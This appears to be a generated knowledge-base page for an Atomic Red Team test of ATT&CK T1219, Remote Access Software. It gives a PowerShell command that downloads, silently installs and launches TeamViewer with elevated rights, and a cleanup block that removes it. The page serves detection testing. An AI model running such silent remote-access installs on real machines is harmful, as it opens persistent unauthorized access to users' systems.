---
atomic_guid: "8ca3b96d-8983-4a7f-b125-fc98cc0a2aa0"
title: "TeamViewer Files Detected Test on Windows"
framework: "atomic"
generated: "true"
attack_technique_id: "T1219"
attack_technique_name: "Remote Access Software"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1219/T1219.yaml"
build_date: "2026-04-26 17:02:12"
executor: "powershell"
aliases:
  - "8ca3b96d-8983-4a7f-b125-fc98cc0a2aa0"
  - "TeamViewer Files Detected Test on Windows"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# TeamViewer Files Detected Test on Windows

An adversary may attempt to trick the user into downloading teamviewer and using this to maintain access to the machine. Download of TeamViewer installer will be at the destination location when sucessfully executed.

## Metadata

- Atomic GUID: 8ca3b96d-8983-4a7f-b125-fc98cc0a2aa0
- Technique: T1219: Remote Access Software
- Platforms: windows
- Executor: powershell
- Elevation Required: True
- Source Path: atomics/T1219/T1219.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1219-remote_access_tools|T1219]]

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\TeamViewer_Setup.exe https://download.teamviewer.com/download/TeamViewer_Setup.exe
$file1 = "C:\Users\" + $env:username + "\Desktop\TeamViewer_Setup.exe"
Start-Process -Wait $file1 /S; 
Start-Process 'C:\Program Files (x86)\TeamViewer\TeamViewer.exe'
```

### Cleanup

```powershell
$file = 'C:\Program Files (x86)\TeamViewer\uninstall.exe'
if(Test-Path $file){ Start-Process $file "/S" -ErrorAction Ignore | Out-Null }
$file1 = "C:\Users\" + $env:username + "\Desktop\TeamViewer_Setup.exe"
Remove-Item $file1 -ErrorAction Ignore | Out-Null
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1219/T1219.yaml)
